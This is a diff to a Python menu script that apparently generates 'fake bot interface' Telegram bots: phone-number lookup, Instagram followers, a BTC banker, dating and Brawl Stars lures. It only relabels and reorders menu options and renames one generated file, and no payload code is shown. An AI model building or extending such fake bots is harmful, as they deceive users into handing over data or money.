@@ -86,11 +86,11 @@ if "12" in user_input:
     token = input(Fore.BLUE +  "\033[91m[\033[92m*\033[91m]\033[95m Enter Your Bot Token \033[96m >>> \033[0m  ")
     print("")
     print("\033[96m< < < ====================================================== > > >\033[0m ")
-    print("\n\033[1;31m[\033[0m\033[1;92m1\033[0m\033[1;31m] \033[0m\033[1;37;44m Phone Number Info \033[0m  ")
-    print("\n\033[1;31m[\033[0m\033[1;92m2\033[0m\033[1;31m] \033[0m\033[1;37;41m Instagram cheat \033[0m  ")
-    print("\n\033[1;31m[\033[0m\033[1;92m3\033[0m\033[1;31m] \033[0m\033[1;91;107m Brawl stars \033[0m  ")
-    print("\n\033[1;31m[\033[0m\033[1;92m4\033[0m\033[1;31m] \033[0m\033[1;48;5;21m Acquaintance \033[0m ")
-    print("\n\033[1;31m[\033[0m\033[1;92m5\033[0m\033[1;31m] \033[0m\033[1;48;5;200m BTC BANKER \033[0m \n ")
+    print("\n\033[1;31m[\033[0m\033[1;92m1\033[0m\033[1;31m] \033[0m\033[1;37;44m Phone Number Info Bot \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m2\033[0m\033[1;31m] \033[0m\033[1;37;41m Instagram Like and Follower \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m3\033[0m\033[1;31m] \033[0m\033[1;91;107m BTC BANKER Bot \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m4\033[0m\033[1;31m] \033[0m\033[1;48;5;21m Dating Bot \033[0m ")
+    print("\n\033[1;31m[\033[0m\033[1;92m5\033[0m\033[1;31m] \033[0m\033[1;48;5;200m Brawl stars LOL Bot \033[0m \n ")
     print(" ")
     choice = input(Fore.MAGENTA +  "\033[96m\033[91m[\033[0m\033[91m *** \033[0m\033[96m]\033[0m\033[96m  Select the Fake Bot Interface Option  \033[91m >>> ")
 	
@@ -151,7 +151,7 @@ def start_bot():
         print("\n")
         print("\033[92m[+] Now Type This Command:\033[93m python instgram.py \033[m \n\n ")
 
-    elif choice == 3:
+    elif choice == 5:
         # Code for choice 3 (Brawl stars)
         f = open('brawl_stars.py', 'w+', encoding='utf-8')
         f.write(f"""
@@ -169,7 +169,7 @@ def start_bot():
 
     elif choice == 4:
         # Code for choice 4 (Acquaintance)
-        f = open('acquaintance.py', 'w+', encoding='utf-8')
+        f = open('datingid.py', 'w+', encoding='utf-8')
         f.write(f"""
 import telebot
 
@@ -192,7 +192,7 @@ def start_bot():
         print("\n")
         print("\033[92m[+] Now Type This Command:\033[93m python b11tc.py \033[m \n\n ")
 
-    elif choice == 5:
+    elif choice == 3:
         # Code for choice 5 (BTC BANKER)
         f = open('btcdata.py', 'w+', encoding='utf-8')
         f.write(f"""
